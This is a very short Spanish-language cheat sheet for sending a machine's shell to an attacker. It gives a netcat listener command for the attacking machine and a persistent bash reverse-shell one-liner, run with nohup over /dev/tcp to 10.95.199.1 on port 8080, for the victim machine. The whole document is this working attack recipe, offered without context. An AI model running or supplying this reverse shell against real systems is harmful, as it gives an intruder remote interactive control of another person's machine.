## Reenviar la shell de una maquina a la nuestra ##
En la maquina atacante:
nc -l 8080
En la maquina atacada:
nohup bash -i >& /dev/tcp/10.95.199.1/8080 0>&1 &
